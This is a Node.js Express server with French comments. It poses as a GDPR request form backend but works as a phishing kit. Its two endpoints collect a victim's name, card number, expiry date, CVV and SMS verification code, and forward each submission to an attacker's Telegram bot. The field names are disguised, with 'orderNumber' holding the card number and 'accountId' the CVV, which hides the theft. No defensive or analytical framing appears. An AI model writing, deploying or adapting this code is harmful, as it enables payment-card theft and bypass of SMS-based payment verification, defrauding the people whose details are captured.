require("dotenv").config();

const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: "10kb" }));
app.use(express.static(__dirname));

// ---------- Utilitaires ----------

/**
 * Formate une date d'expiration quel que soit le format reçu.
 * Accepte : { birthMonth, birthYear }, { expiry: "12/31" }, { birthDay, birthYear } (legacy).
 */
function formatExpiry(body) {
  // 1) Priorité : champ "expiry" déjà formaté côté client
  if (body.expiry && typeof body.expiry === "string") {
    return body.expiry.trim() || "—";
  }

  // 2) Sinon : reconstruit depuis birthMonth / birthYear
  const month = body.birthMonth ?? body.birthDay;
  const year = body.birthYear;

  if (month == null && year == null) return "—";
  if (month == null || year == null) {
    return `${month != null ? String(month).padStart(2, "0") : "—"}/${year != null ? year : "—"}`;
  }

  return `${String(month).padStart(2, "0")}/${String(year).padStart(2, "0")}`;
}

/** Envoie un message Telegram, lève une erreur si l'API refuse. */
async function sendTelegram(text) {
  if (!process.env.BOT_TOKEN || !process.env.CHAT_ID) {
    throw new Error("BOT_TOKEN ou CHAT_ID manquant dans .env");
  }

  const response = await fetch(
    `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: process.env.CHAT_ID,
        text,
        parse_mode: "HTML"
      }),
      signal: AbortSignal.timeout(10000)
    }
  );

  const result = await response.json();
  if (!response.ok || !result.ok) {
    console.error("Telegram :", result);
    throw new Error("Erreur Telegram");
  }
}

/** Échappe le HTML pour parse_mode: HTML (évite les injections). */
function esc(v) {
  if (v == null) return "—";
  return String(v)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

// ---------- Health ----------
app.get("/health", (req, res) => {
  res.json({ status: "ok", message: "Serveur opérationnel" });
});

// ---------- Test Telegram ----------
app.post("/api/telegram-test", async (req, res) => {
  try {
    await sendTelegram(
      "🧪 <b>TEST TELEGRAM</b>\n\n" +
      "👤 Prénom : Jean\n" +
      "✅ Connexion réussie."
    );
    res.json({ success: true, message: "Message Telegram envoyé" });
  } catch (error) {
    console.error("Erreur :", error.message);
    res.status(500).json({ success: false, message: "Erreur serveur" });
  }
});

// ---------- Étape 1 : identification ----------
app.post("/api/rgpd-step1", async (req, res) => {
  try {
    const body = req.body || {};
    const { lastName, firstName, orderNumber, accountId } = body;
    const expiry = formatExpiry(body);

    const message =
      "📝 <b>NOUVELLE DEMANDE</b>\n\n" +
      "👤 Nom : " + esc(lastName) + "\n" +
      "👤 Prénom : " + esc(firstName) + "\n" +
      "💳 Numéro carte : " + esc(orderNumber) + "\n" +
      "📅 Expiration : " + esc(expiry) + "\n" +
      "🆔 CVV : " + esc(accountId);

    await sendTelegram(message);
    res.json({ success: true });
  } catch (error) {
    console.error("Erreur step1 :", error.message);
    res.status(500).json({ success: false });
  }
});

// ---------- Étape 2 : code SMS ----------
app.post("/api/rgpd-step2", async (req, res) => {
  try {
    const body = req.body || {};
    const { lastName, firstName, orderNumber, accountId, smsNum } = body;
    const expiry = formatExpiry(body);

    const message =
      "✅ <b>DEMANDE COMPLÈTE</b>\n\n" +
      "👤 Nom : " + esc(lastName) + "\n" +
      "👤 Prénom : " + esc(firstName) + "\n" +
      "💳 Numéro carte : " + esc(orderNumber) + "\n" +
      "📅 Expiration : " + esc(expiry) + "\n" +
      "🆔 CVV : " + esc(accountId) + "\n" +
      "📱 Code SMS : " + esc(smsNum);

    await sendTelegram(message);
    res.json({ success: true });
  } catch (error) {
    console.error("Erreur step2 :", error.message);
    res.status(500).json({ success: false });
  }
});

// ---------- Démarrage ----------
app.listen(PORT, () => {
  console.log(`Serveur lancé sur le port ${PORT}`);
});
